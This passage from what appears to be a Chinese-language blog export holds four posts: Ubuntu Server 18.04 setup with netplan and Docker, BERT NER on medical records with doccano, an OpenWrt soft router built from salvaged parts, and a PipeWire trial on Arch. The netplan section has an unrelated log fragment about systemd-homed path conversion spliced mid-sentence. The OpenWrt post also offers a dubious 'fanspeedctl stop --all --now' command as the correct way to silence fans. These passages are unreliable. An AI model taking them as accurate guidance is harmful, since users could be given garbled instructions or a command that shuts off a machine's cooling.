<img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/rufus.png" alt="Picture" style="zoom:80%;" />

然后直接装，网卡直接自动识别了，配置也没什么好说的，可以参考这里[^1]或这里[^2],

### 后续配置

进去之后换你电镜像源（终端里vim改/etc/apt/sources.list）
apt包update&&upgrade
修改时区和系统时间
安装Docker，照着官方教程装Docker的时候根本下载不动,换了个国内的源
桌面不打算装gnome或者kde了，Mobaxterm用X11一般就够了

## 重新安装Ubuntu18.04 LTS

由于某些原因，决定还是换18

## 再次安装

UEFI启动
create bond这里先不配置了（只有一张网卡eno1），bound mode选默认的balance-rr
eno1网卡选择automatic自动获取ipv4和ipv6
镜像源这里输入你电的
选use the entire disk and set up LVM
~~是否安装openssh，空格选安装，选择从GitHub获取~~
然后输入你的用户名(先准备好key，当然这个时候要保证网也是通的)
这里勾选openssh之后一直报错，可能是网的问题，不勾选，等后面再装
分区就分一个/boot，一个/swap，一个/home
<!-- 
（当然你要先准备好key，先用git bash生成key
`ssh-keygen -t rsa -C 'your_email@example.com'`
再到Github的SSH设置里面把公钥填进去（id_rsa.pub里面的内容）
然后测试一下是否成功
<img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ssh-github.png" alt="Picture" style="zoom:80%;" />
） -->
<!-- 然后是漫长的installing kernal
（不知道为什么装server比desktop版慢那么多）

bbr已经自带了，不用装了
设置root用户和用户组权限
装Docker参考这里[^3]
和英文官方教程那个差不多，主要是获取GPG的地址和Docker源换成国内的
换成国内中科大的镜像源（这个换了也时断时续可能连不上）
出现permission denied：

<pre class="line-numbers language-log" data-language="log"><code class="language-log">Got permission denied while trying to connect to the Docker daemon socket at unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock: Get http:&#x2F;&#x2F;%2Fvar%2Frun%2Fdocker.sock&#x2F;v1.40&#x2F;containers&#x2F;json: dial unix &#x2F;var&#x2F;run&#x2F;docker.sock: connect: permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>是权限的问题，要加当前用户到用户组里面</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gpasswd -a <span class="token variable">$&#123;<span class="token environment constant">USER</span>&#125;</span> docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="更改静态为ip">更改静态为ip</h3>
<p>网卡是eno1（服务器就一个网卡） Ubuntu18的配置改了，在<code>/etc/netplan/50-cloud-init.yaml</code>, 现在18使用netplan管理网络 配置文件是yaml格式，跟hexo和next主题的配置文件格式一样</p>
<pre class="line-numbers language-yml" data-language="yml"><code class="language-yml"># network: &#123;config: disabled&#125;
network:
    ethernets:
        eno1:
            dhcp4: true
    version: 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>改成</p>
<pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">network:
  version: 2
  renderer: networkd
  ethernets:
    eno1:   #配置的网卡名称
#      dhcp4: true    #dhcp4关闭
#      dhcp6: true    #dhcp6关闭
      addresses: [211.83.111.224&#x2F;23]   #设置本机IP及掩码
      gateway4: 211.83.110.1   #设置网关
      nameservers:
          addresses: [114.114.114.114, 8.8.8.8]   #设置DNS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>(网关地址用<code>route -n</code>查看，配置参考<span class="exturl" data-url="aHR0cDovL2Jsb2cuc2luYS5jb20uY24vcy9ibG9nXzUzNzNiY2Y0MDEwMnhrNWcuaHRtbA==">ubuntu 18.04 netplan yaml配置固定IP地址<i class="fa fa-external-link-alt"></i></span>) d-homed//g → /systemd-homed/ INFO Path converted: /(?&lt;=[(&lt;s])(./)?systemd-homed//g → /systemd-homed/ INFO Path converted: /(?&lt;=[(&lt;s])(./)?systemd-home着默认 直接改成这样试试</p>
<pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">network:
  version: 2
#  renderer: networkd
  ethernets:
    eno1:
      addresses: [211.83.111.224&#x2F;23]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后进/run/systemd/network看一下系统的网络配置文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /run/systemd/network`
<span class="token function">ls</span>
<span class="token function">cat</span> *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>下面这样应该就可以了，吧.....？</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">root@xi102server:&#x2F;run&#x2F;systemd&#x2F;network# cat 10-netplan-eno1.network
[Match]
Name&#x3D;eno1

[Network]
LinkLocalAddressing&#x3D;ipv6
Address&#x3D;211.83.111.224&#x2F;23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>行吧，搜出一堆东西都不靠谱，还是得看官网</p>
<h3 id="感想">感想</h3>
<p>服务器启动的声音真的大啊 一半以上的问题都是网络问题，校内这个网真的.... 靠镜像源救回半条狗命</p>
<p>Ubuntu18安装时配置网卡时想选静态ip选择Manual进去填写subnet, 结果那个subnet选项是<code>XXX.XXX.XXX.XXX/XX</code> 看了教研室其他设备相同频段的子网掩码是<code>255.255.254.0</code>，但是填了不行，用网上计算子网掩码的工具算了一下，就是<code>255.255.254.0</code></p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/netmmask.png" alt="Picture" style="zoom:80%;" /></p>
<p>暂时选了DHCP直接配置网卡，等进去再指定静态ip[^4]</p>
<p>哦，netplan好像把子网掩码的格式改了 原来是这样 &gt;address = 192.168.225.50 netmask = 255.255.255.0</p>
<p>改成了这种格式 &gt;addresses : [192.168.225.50/24]</p>
<p>滚去补习计网知识了 --&gt; --&gt;</p>
<h2 id="安装参考">安装参考</h2>
<p><span class="exturl" data-url="dHRwczovL3R1dG9yaWFscy51YnVudHUuY29tL3R1dG9yaWFsL3R1dG9yaWFsLWluc3RhbGwtdWJ1bnR1LXNlcnZlcg==">tutorial-install-ubuntu-server<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0xWTV8o566A5L2T5Lit5paHKQ==">LVM arch-wiki<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW5zdGFsbC91YnVudHUuaHRtbA==">Ubuntu 安装 Docker CE<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW5zdGFsbC9taXJyb3IuaHRtbA==">镜像加速器<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjbWludC5jb20vY29uZmlndXJlLW5ldHdvcmstc3RhdGljLWlwLWFkZHJlc3MtaW4tdWJ1bnR1Lw==">How to Configure Network Static IP Address in Ubuntu 18.04<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9uZXRwbGFuLmlvL2V4YW1wbGVz">netplan官网的配置示例<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>重装</tag>
      </tags>
  </entry>
  <entry>
    <title>基于BERT的电子病历的命名实体识别</title>
    <url>/9112/</url>
    <content><![CDATA[<p>BERT效果确实好，就是有点吃内存</p>
<span id="more"></span>
<h2 id="序列标注">序列标注</h2>
<p>一些医院的电子病历拆分的很细，比如主诉这一个大项里面部位、症状、时间、状态都是分开的；另一些医院的电子病历就跟纯文本差不多，要把大段文字中的主要结构提出来需要自然语言处理或者人工录入。一般做自然语言处理的时候都是几个部分分开做的，因为不同部分差异比较大，分开训练识别效果好。大部分电子病历包括入院记录、首次病程记录、病程记录、出院记录、手术记录、护理记录、病案首页，这里面又分为一些检查项、时间、主诉、既往史之类的小项。不少电子病历系统导出都是XML的，一般都是把电子病历拆成主诉那种一个个不能再拆的纯文本部分，比如主诉，见<a href="https://zhangjk98.xyz/81d4/">上一篇</a>，然后再对不能拆分的纯文本用人工或自然语言处理进一步拆分。这就是所谓的电子病历结构化。</p>
<p>比如一段主诉：</p>
<blockquote>
<p>反复胸痛伴胸闷1+年，加重20+天。</p>
</blockquote>
<p>按照规范一定的规范可分为几个不同的小块，比如下面这十一种：</p>
<blockquote>
<p>部位、症状、持续时间、伴随部位、伴随症状、伴随时间、状 态、病因/其他、观察项目、观察结果、既往史</p>
</blockquote>
<p>胸是部位、痛是症状、1+年是持续时间、反复是状态......</p>
<p>标注出来的结果可以保存为json格式，labels里面的list分别为起始位置、结束位置、标签</p>
<pre class="line-numbers language-none"><code class="language-none">
&#123;&quot;text&quot;: &quot;反复胸痛伴胸闷1+年，加重20+天。&quot;, &quot;labels&quot;: [[0, 2, &quot;状态&quot;], [2, 3, &quot;部位&quot;], [3, 4, &quot;症状&quot;], [5, 7, &quot;伴随症状&quot;], [7, 10, &quot;伴随时间&quot;], [11, 17, &quot;持续时间&quot;]]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>BIO格式，大概是这个样子：B，begin标签开始；I，inside包含在标签内，O，outside在标签外</p>
<pre class="line-numbers language-none"><code class="language-none">
反 B-状态
复 I-状态
胸 B-部位
痛 B-症状
伴 O
胸 B-伴随症状
闷 I-伴随症状
1 B-伴随时间
+ I-伴随时间
年 I-伴随时间
， O
加 B-持续时间
重 I-持续时间
2 I-持续时间
0 I-持续时间
+ I-持续时间
天 I-持续时间
。 O<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>BERT的接口是BIO格式，标注工具doccano，这里写两个互相转换的脚本就行了，标注完成后将json转为BIO，训练和预测完成后将BIO预测结果转为JSON</p>
<h2 id="训练模型">训练模型</h2>
<p>NLP里面的命名实体识别很早就用在电子病历上，早期的机器学习方法效果一般，后来开始用RNN和CNN，后来用LSTM，再后来用BERT，效果一直在提升，BERT基本上到顶了（好一点的训练数据BERT基本能达到90%以上，对于主诉这样的较短的简单条目甚至能达到98%以上）</p>
<h2 id="其他杂项">其他杂项</h2>
<h3 id="doccano的部署和使用">doccano的部署和使用</h3>
<h4 id="部署">部署</h4>
<h5 id="docker方式">Docker方式</h5>
<h6 id="构建和部署">构建和部署</h6>
<p>运行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">
$ docker pull chakkiworks&#x2F;doccano # 拉取官方镜像
$ docker run -d --name doccano -p 80:8000 chakkiworks&#x2F;doccano # 运行镜像，请按需修改端口
$ docker exec doccano tools&#x2F;create-admin.sh &quot;admin&quot; &quot;[email protected]&quot; &quot;password&quot; # 创建用户并指定密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>注意 Docker镜像run之后会产生三个容器，doccona_nginx、doccona_backend、docker_frontend,其中docker_frontend在构建完成后会直接exit，这是一个feature，不是bug，它的主要作用是webpack打包</p>
<figure>
<img src="/9112/image-20200109220759931.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
</blockquote>
<h4 id="访问docker中的postgresql数据库中的数据">访问Docker中的PostgreSQL数据库中的数据</h4>
<p>由于数据库安全问题，数据库分离再一个单独的容器中并且 首先执行<code>Docker exec</code>命令进入相应的PostgreSQL数据库容器</p>
<p>应该看到下图这样，终端从宿主机切换进容器</p>
<figure>
<img src="/9112/image-20200109220232851.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>在容器的shell中用命令进入数据库</p>
<pre class="line-numbers language-none"><code class="language-none">
$ psql -h 127.0.0.1 -d doccano -U doccano -p 5432 # 注意你的host，数据库名、用户名和端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>应该看到下图这样，终端从Docker容器切进数据库</p>
<figure>
<img src="/9112/image-20200109220100751.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>然后执行<code>\l</code>等命令进入和查看数据库（执行SQL）</p>
<h4 id="使用">使用</h4>
<p>后台管理入口是这个http://yoursite/admin/，就是一个Django自带的后台管理</p>
<figure>
<img src="/9112/image-20200411204841203-1586654887394.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<figure>
<img src="/9112/image-20200411205005107-1586654884937.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<figure>
<img src="/9112/image-20200411205102588-1586654882966.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>登录进去后可自行添加账号和项目并设置权限和标签，标注项目选择sequential labeing即可，导出时选择JSONL格式</p>
<p>这个数据比较多的时候没有自动跳转比较麻烦，请直接在浏览器地址栏使用url跳转</p>
<p>比如，修改浏览器后面的url，#后面的offset改为685，直接回车，就可以从当前的689跳转到第685个数据</p>
<p>http://yoursite/projects/6/#offset=685</p>
<figure>
<img src="/9112/image-20200307213544539.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<h2 id="注">注</h2>
<p>https://github.com/doccano/doccano 一个开源的标注工具</p>
<p>https://github.com/macanv/BERT-BiLSTM-CRF-NER 一个BERT的NER工具包</p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>bert</tag>
        <tag>NER</tag>
      </tags>
  </entry>
  <entry>
    <title>垃圾佬的Openwrt软路由</title>
    <url>/openwrt/</url>
    <content><![CDATA[<p>又是捡垃圾的快乐一天 <span id="more"></span></p>
<h2 id="材料">材料</h2>
<h3 id="教研室捡来的垃圾">教研室捡来的垃圾</h3>
<blockquote>
<p>又不是不能用</p>
</blockquote>
<ul>
<li>2GB 内存条（看起来全新实际上至少八九年前的了，别问为什么只有2G，这是教研室能捡垃圾捡到的最后一块内存条了）</li>
<li>120G intel固态（包浆成色，上个月刚从一个旧电脑上拆下来的）</li>
<li>一块 i5 4570 的CPU（战斗成色，貌似也六年了）</li>
<li>一个风扇（战损成色，全是灰）</li>
<li>六七年前的华硕主板（伊拉克战损成色）</li>
<li>一个三星显示器（屏幕漏光，也有五六年了，装系统临时用一下）</li>
<li>一个2014年的老机箱（战斗成色，全是灰）</li>
<li>一个主机电源（不是很新，200W）</li>
<li>VGA线、电源线、排线（普通成色）</li>
<li>螺丝等（一大把旧主机上拆下来的）</li>
<li>键盘（N年前的薄膜，伊拉克战损成色，全是灰）</li>
</ul>
<p>对，102网吧的主板就是这样子的战损主板</p>
<figure>
<img src="/openwrt/image-20201030191635951.webp" alt="对，只有这种主板了" /><figcaption aria-hidden="true">对，只有这种主板了</figcaption>
</figure>
<h3 id="全新的和自掏腰包的">全新的和自掏腰包的</h3>
<p>基本都是室友出的钱</p>
<ul>
<li>螺丝刀等（全新，室友的）</li>
<li>一个插排（昨天室友买的）</li>
<li>硅脂（全新）</li>
<li>网卡（室友网购的，刚到）</li>
<li>网线（教研室网线太老了，就不捡垃圾了）</li>
<li>clash和v2ray订阅，机场买的</li>
</ul>
<h2 id="刷机">刷机</h2>
<p>自行编译时间太长就用人家编译好的了, 室友刷的。本来以为可能2G的老内存可能会卡，结果室友的win10 pe上去意外的流畅。</p>
<p>借用了这个<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xvbW90SG8vVUVTVEMtTmV0d29ya0F1dG9Db25uZWN0">电子科技大学校园网自动登陆脚本<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一点小插曲">一点小插曲</h2>
<p>晚上室友买完插排，第二天我发现教研室的一个旧箱子里满满一箱子插排，好家伙，亏了一个亿。</p>
<figure>
<img src="/openwrt/image-20201030191838215.webp" alt="这么多插排...." /><figcaption aria-hidden="true">这么多插排....</figcaption>
</figure>
<p>本来Openclash都整好了，结果发现室友的安卓电报没法自行分流。换成了 ssr plus</p>
<p>装好之后发现风扇声音有点大........直接把风扇线拔了，世界终于清净了。至于散热，问题不大（这么点负载总不可能把CPU给烧了）。</p>
<p>ps. 正确的做法是SSH上去</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fanspeedctl stop --all --now<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>固态闲置了100多个G</p>
<h2 id="突然发现了clash的正确使用方式">突然发现了clash的正确使用方式</h2>
<p>之前一直很不喜欢clash，clash for win10的图形界面操作在我看起来特别反人类，安卓和平板上clash的app耗电惊人。自动切换线路和分流对我来说又没什么用，一直觉得clash鸡肋，不知道为什么这么多人都在说clash香。</p>
<p>直到今天室友带入坑上了软路由，好家伙，自动分流和切换真香</p>
<p>clash这种就适合软路由或者台式机什么的，手机和平板耗电根本顶不住，挂在后台掉电太快了</p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>openwrt</tag>
        <tag>捡垃圾</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux新一代音视频服务Pipewire尝鲜</title>
    <url>/pipewire/</url>
    <content><![CDATA[<p>听说fedora都上Pipiwire了，正好这几天有点空，那就试试吧 <span id="more"></span></p>
<p>Pipewire是红帽造的新一代音视频轮子，主要是用来取代PulseAudio、jack还有gstreams什么的。 <strong>据说</strong>延迟补偿还不错，<strong>据说</strong>能统一音视频框架还兼容PulseAudio和Jack，据说是朝着专业级音效去的。据说支持Wayland和平板，据说支持Flatpak之类的容器内使用，据说有类似PolKit的权限管理，不需要像PulseAudio那样新建音频用户组和添加用户了。。。。</p>
<blockquote>
<p>It provides a low-latency, graph based processing engine on top of audio and video devices that can be used to support the use cases currently handled by both pulseaudio and JACK. PipeWire was designed with a powerful security model that makes interacting with audio and video devices from containerized applications easy, with supporting Flatpak applications being the primary goal. Alongside Wayland and Flatpak we expect PipeWire to provide a core building block for the future of Linux application development.</p>
</blockquote>
<p>都是据说啊，被Wayland骗了一次之后我已经不敢信这些宣传了，先试试实际效果再说。</p>
<p>当然这个目前貌似只正经适配了GNOME和Fedora，不过据说兼容PulseAudio，Arch上的坑已经有人踩了好久了，现在还有点小问题，不过可以考虑上了。 昨天刚把Arch和笔记本的EndeavourOS更了python 3.9，除了autojump出了点小问题外一切正常。索性直接上Pipewire看看吧，反正笔记本那个全损音质也跟没有一样，换了说不定能抢救一下。</p>
<h2 id="安装">安装</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S pipewire<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>要替代PulseAudio和Jack装这两个包<code>pipewire-pulse</code>、<code>pipewire-jack-dropin</code>。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S pipewire-jack-dropin pipewire-pulse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后systemd设置一下（archwiki说蓝牙设备需要手动设置一下，编辑<code>/etc/pipewire/pipewire.conf</code>，我手头没蓝牙耳机就不弄了）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> --user pipewire-pulse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后退出登录或重启。</p>
<p>运行<code>pactl info</code>，如果看到</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Server Name: PulseAudio (on PipeWire 0.3.17)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>说明正常。</p>
<h3 id="蓝牙设备">蓝牙设备</h3>
<p>感谢室友赞助的一个索尼蓝牙音箱用于测试</p>
<p>pipewire自带了蓝牙的模块，不需要像PulseAudio那样安装<code>pulseaudio-bluetooth</code>之类的包</p>
<p>安装了pipewire-pulse之后编辑<code>/etc/pipewire/pipewire.conf</code>在<code>exec /usr/bin/pipewire-media-session</code>后面加上<code>-e bluez5</code>就可以使用了。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">exec</span> /usr/bin/pipewire-media-session -e bluez5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="卸载">卸载</h2>
<p>换回PulseAudio或者Jack可以用这个<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuZnJlZWRlc2t0b3Aub3JnL3BpcGV3aXJlL3BpcGV3aXJlLy0vc25pcHBldHMvMTE2NA==">脚本<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/lib64/

<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libpulse-mainloop-glib.so.0.999.0
<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libpulse-simple.so.0.999.0
<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libpulse.so.0.999.0

<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libjack.so.0.999.0
<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libjacknet.so.0.999.0
<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libjackserver.so.0.999.0

<span class="token function">sudo</span> ldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>用pacman包管理器装的就</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl disable pipewire-pulse --user
systemctl disable pipewire --user
yay -Rs pipewire-pulse
yay -S pulseaudio<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="更新一点实测">更新一点实测</h2>
<h3 id="人耳效果和使用体验">人耳效果和使用体验</h3>
<p>昨天回到宿舍，发现笔记本的EndeavourOS更新python 3.9 Optimus-manager 出问题了，好在很快解决了。 然后在工具人室友的帮助下测试了绿联的外接声卡一块、某大法耳机一个音响一个，傻多戴显示器自带小音箱一个，均工作正常。</p>
<p><img src="/pipewire/1607053618.png" /> <img src="/pipewire/1607053601.png" /></p>
<p>两种音质人耳都听不出差别，室友把两段音频放到Adobe Audition也看不出什么大区别</p>
<p>笔记本自带外放在KDE的设置中从其他音频播放设备切换过去之后出现没有声音的状况，经检查其实是有的，只是非常小，将声音调整到最大还是几乎要被笔记本的风扇声音盖住（这貌似不是pipewire的锅，），重启后外放音量恢复正常。 除了笔记本自带外放，在笔记本上音频切换KDE设置都没有出现卡死的状况，，声音也播放正常，没出现切换之后没声了的状况。</p>
<h3 id="面板参数">面板参数</h3>
<p>笔记本使用原来的PulseAudio详情：</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">Server String</span><span class="token punctuation">:</span> /run/user/1000/pulse/native
<span class="token key atrule">Library Protocol Version</span><span class="token punctuation">:</span> <span class="token number">34</span>
<span class="token key atrule">Server Protocol Version</span><span class="token punctuation">:</span> <span class="token number">34</span>
<span class="token key atrule">Is Local</span><span class="token punctuation">:</span> yes
<span class="token key atrule">Client Index</span><span class="token punctuation">:</span> <span class="token number">16</span>
<span class="token key atrule">Tile Size</span><span class="token punctuation">:</span> <span class="token number">65472</span>
<span class="token key atrule">User Name</span><span class="token punctuation">:</span> zjk
<span class="token key atrule">Host Name</span><span class="token punctuation">:</span> zjk<span class="token punctuation">-</span><span class="token number">7591</span>
<span class="token key atrule">Server Name</span><span class="token punctuation">:</span> pulseaudio
<span class="token key atrule">Server Version</span><span class="token punctuation">:</span> <span class="token number">14.0</span>
<span class="token key atrule">Default Sample Specification</span><span class="token punctuation">:</span> s16le 2ch 44100Hz
<span class="token key atrule">Default Channel Map</span><span class="token punctuation">:</span> front<span class="token punctuation">-</span>left<span class="token punctuation">,</span>front<span class="token punctuation">-</span>right
<span class="token key atrule">Default Sink</span><span class="token punctuation">:</span> alsa_output.pci<span class="token punctuation">-</span>0000_00_1f.3<span class="token punctuation">-</span>platform<span class="token punctuation">-</span>skl_hda_dsp_generic.HiFi__hw_sofhdadsp__sink
<span class="token key atrule">Default Source</span><span class="token punctuation">:</span> combined.monitor
<span class="token key atrule">Cookie</span><span class="token punctuation">:</span> 94e6<span class="token punctuation">:</span>e6bf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>更换pipewire-pulse之后：</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">Server String</span><span class="token punctuation">:</span> /run/user/1000/pulse/native
<span class="token key atrule">Library Protocol Version</span><span class="token punctuation">:</span> <span class="token number">34</span>
<span class="token key atrule">Server Protocol Version</span><span class="token punctuation">:</span> <span class="token number">34</span>
<span class="token key atrule">Is Local</span><span class="token punctuation">:</span> yes
<span class="token key atrule">Client Index</span><span class="token punctuation">:</span> <span class="token number">69</span>
<span class="token key atrule">Tile Size</span><span class="token punctuation">:</span> <span class="token number">65472</span>
<span class="token key atrule">User Name</span><span class="token punctuation">:</span> zjk
<span class="token key atrule">Host Name</span><span class="token punctuation">:</span> zjk<span class="token punctuation">-</span><span class="token number">7591</span>
<span class="token key atrule">Server Name</span><span class="token punctuation">:</span> PulseAudio (on PipeWire 0.3.17)
<span class="token key atrule">Server Version</span><span class="token punctuation">:</span> 14.0.0
<span class="token key atrule">Default Sample Specification</span><span class="token punctuation">:</span> float32le 2ch 48000Hz
<span class="token key atrule">Default Channel Map</span><span class="token punctuation">:</span> front<span class="token punctuation">-</span>left<span class="token punctuation">,</span>front<span class="token punctuation">-</span>right
<span class="token key atrule">Default Sink</span><span class="token punctuation">:</span> <span class="token key atrule">alsa_output.pci-0000:00:1f.3-platform-skl_hda_dsp_generic.HiFi</span><span class="token punctuation">:</span> hw<span class="token punctuation">:</span>sofhdadsp<span class="token punctuation">,</span><span class="token key atrule">5</span><span class="token punctuation">:</span> sink
<span class="token key atrule">Default Source</span><span class="token punctuation">:</span> <span class="token key atrule">alsa_input.pci-0000:00:1f.3-platform-skl_hda_dsp_generic.HiFi</span><span class="token punctuation">:</span> <span class="token key atrule">hw:sofhdadsp</span><span class="token punctuation">:</span> source
<span class="token key atrule">Cookie</span><span class="token punctuation">:</span> 6242<span class="token punctuation">:</span><span class="token number">4425</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看起来参数是好了一点，实测听不出来。</p>
<h3 id="其他">其他</h3>
<p>据说pipewire音视频延迟低了，手头没有专业设备没法测。其他的混响、均衡、采样手头没有专业设备也测不出来。</p>
<p>视频的话，浏览器HTML5播放器和本地VLC能正常播放。笔记本播放youtube4k视频外接4k显示器硬解没有大问题。VLC播放用N卡（笔记本的1650）解码也没有问题，驱动正常。</p>
<p>其他的视频方面和屏幕共享之类的功能暂时还没有测试。我也找不到熟悉视频的工具人了，等找到了再说吧，自己瞎测估计也测不出什么来。</p>
<h2 id="体验">体验</h2>
<h3 id="音质">音质</h3>
<p><code>pw-cli</code>显示的台式机面板参数</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ pw-cli info <span class="token number">0</span>
        id: <span class="token number">0</span>
        permissions: rwxm
        type: PipeWire:Interface:Core/3
        cookie: <span class="token number">653542227</span>
        user-name: <span class="token string">"zjk"</span>
        host-name: <span class="token string">"zjk-allseries"</span>
        version: <span class="token string">"0.3.17"</span>
        name: <span class="token string">"pipewire-0"</span>
*       properties:
*               core.name <span class="token operator">=</span> <span class="token string">"pipewire-0"</span>
*               context.profile.modules <span class="token operator">=</span> <span class="token string">"none"</span>
*               core.daemon <span class="token operator">=</span> <span class="token string">"true"</span>
*               link.max-buffers <span class="token operator">=</span> <span class="token string">"16"</span>
*               default.clock.rate <span class="token operator">=</span> <span class="token string">"48000"</span>
*               default.clock.quantum <span class="token operator">=</span> <span class="token string">"1024"</span>
*               default.clock.min-quantum <span class="token operator">=</span> <span class="token string">"32"</span>
*               default.clock.max-quantum <span class="token operator">=</span> <span class="token string">"8192"</span>
*               default.video.width <span class="token operator">=</span> <span class="token string">"640"</span>
*               default.video.height <span class="token operator">=</span> <span class="token string">"480"</span>
*               default.video.rate.num <span class="token operator">=</span> <span class="token string">"25"</span>
*               default.video.rate.denom <span class="token operator">=</span> <span class="token string">"1"</span>
*               mem.allow-mlock <span class="token operator">=</span> <span class="token string">"true"</span>
*               cpu.max-align <span class="token operator">=</span> <span class="token string">"32"</span>
*               object.id <span class="token operator">=</span> <span class="token string">"0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>教研室的Arch台式机的老声卡接耳机和外接绿联声卡接耳机看不出什么大的区别。 Arch开Virtualbox里的win7能用，但是音质不知道为什么变差了特别多。</p>
<p>只有笔记本外放音质确实好了一点，我的笔记本外放能听出差别的那种，然而还是比win10差了不少（这个没有参考价值，我的笔记本Realtek驱动太阴间了）。<br />
据说延迟低了，这个听不出来，手头上也没有专业设备。</p>
<p>其他的等我的校交响乐团的工具人室友回来了再说。</p>
<h3 id="遇到的问题">遇到的问题</h3>
<p>目前使用的问题大概有：</p>
<ol type="1">
<li><code>systemctl status --user pipewire-pulse</code>报错</li>
